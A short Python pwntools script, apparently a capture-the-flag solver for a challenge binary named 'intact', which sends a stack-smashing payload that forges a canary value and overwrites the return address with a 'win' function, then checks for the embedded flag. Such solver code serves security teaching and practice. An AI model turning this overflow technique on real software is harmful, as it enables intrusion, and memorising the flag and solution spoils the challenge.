from pathlib import Path
from pwn import *

HOST = "localhost"
PORT = 2007
FLAG = "magpie{&&_th3_c4n@r1_dld_n()7_s!ng}"

def solve() -> bool:
    elf = ELF("./intact")
    prc = remote(HOST, PORT)
    #prc = process("./intact")

    win = p64(elf.symbols['win'])
    pad = 12 * b"U"

    smash = b"passwordcanary\0password" + pad + win

    prc.sendline(smash)

    prc.recvline()
    prc.recvline()
    return FLAG in prc.recvline().decode()
